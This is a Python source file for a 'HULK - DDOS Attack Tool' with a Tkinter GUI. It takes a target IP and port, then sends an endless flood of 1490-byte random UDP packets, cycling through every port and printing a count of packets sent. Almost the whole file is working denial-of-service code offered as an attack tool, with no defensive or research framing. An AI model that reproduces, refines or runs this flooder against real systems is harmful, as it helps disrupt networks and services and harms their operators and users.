import os
import time
import socket
import random
from datetime import datetime
from tkinter import *
from tkinter.ttk import *
from time import strftime

class HulkDDOS:
    def __init__(self):
        self.root = Tk()
        self.setup_window()
        self.setup_widgets()
        
    def setup_window(self):
        """Configure the main window settings"""
        self.root.title("HULK - DDOS Attack Tool")
        self.root.geometry("350x200+385+105")
        self.root.resizable(0, 0)
        
    def setup_widgets(self):
        """Create and arrange all GUI elements"""
        # Clock label
        self.time_label = Label(
            self.root,
            font=('calibri', 20, 'bold'),
            background='purple',
            foreground='white'
        )
        self.time_label.pack(anchor='s')
        
        # IP input
        Label(self.root, text="IP Address").pack(side=TOP)
        self.ip_entry = Entry(self.root)
        self.ip_entry.pack(side=TOP)
        
        # Port input
        Label(self.root, text="Port").pack(side=TOP)
        self.port_entry = Entry(self.root)
        self.port_entry.pack(side=TOP)
        
        # Attack button
        Button(self.root, text="Attack", command=self.attack).pack(side=TOP)
        
    def update_clock(self):
        """Update the clock display"""
        time_string = strftime('%H:%M:%S %p')
        self.time_label.config(text=time_string)
        self.time_label.after(1000, self.update_clock)
        
    def show_progress(self):
        """Display attack progress animation"""
        progress_steps = [
            ("[>                      ] 0% ", 0.5),
            ("[=====>      H          ] 25%", 0.5),
            ("[==========> U          ] 50%", 0.5),
            ("[==========  L ====>    ] 75%", 0.5),
            ("[==========  K ========>] 100%", 3)
        ]
        
        for message, delay in progress_steps:
            print(message)
            time.sleep(delay)
            
    def attack(self):
        """Execute the DDOS attack"""
        try:
            # Initialize attack parameters
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes_data = random._urandom(1490)
            
            # Get target information
            ip = self.ip_entry.get()
            port = int(self.port_entry.get())
            
            os.system("clear")
            self.show_progress()
            
            # Start attack
            sent = 0
            while True:
                sock.sendto(bytes_data, (ip, port))
                sent += 1
                port = port + 1 if port < 65534 else 1
                print(f"Sent {sent} packet to {ip} through port:{port} -by HULK")
                
        except Exception as e:
            print(f"Error: {str(e)}")
            
    def run(self):
        """Start the application"""
        self.update_clock()
        self.root.mainloop()

if __name__ == "__main__":
    app = HulkDDOS()
    app.run()
